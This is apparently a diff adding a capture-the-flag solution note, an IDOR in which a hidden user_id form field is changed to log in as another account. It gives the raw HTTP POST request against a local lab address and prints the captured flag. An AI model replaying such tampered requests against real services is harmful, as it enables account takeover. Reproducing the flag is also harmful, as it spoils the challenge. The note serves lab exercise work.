@@ -1,0 +1,8 @@
+# IDOR via hidden user_id field in login form. POST /password/test with user_id=10001 instead of 10032 authenticates as the flag account. Redirects to /dashboard showing flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}
+
+POST /password/test HTTP/1.1
+Host: 172.17.0.1:56629
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+username=test&user_id=10001&password=test
